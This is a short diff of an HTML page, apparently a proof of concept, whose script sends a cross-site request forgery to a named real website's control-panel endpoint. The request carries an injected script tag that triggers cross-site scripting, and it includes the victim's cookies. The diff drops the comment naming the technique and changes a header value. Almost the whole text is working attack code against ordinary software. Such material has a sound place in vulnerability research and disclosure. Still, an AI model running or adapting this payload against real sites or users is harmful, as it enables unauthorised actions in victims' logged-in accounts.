@@ -7,11 +7,10 @@
 <h2>Loading your account...</h2>
 
 <script>
-// CSRF to trigger the XSS
 fetch('https://www.preloved.co.uk/controlpanel/testemail?p8t7i8=1--><script>alert(document.domain)</script>', {
     method: 'GET',
     headers: {
-        'X-Middleton': '1asd213'
+        'X-Middleton': '1123asd213'
     },
     credentials: 'include'  // Send cookies
 })
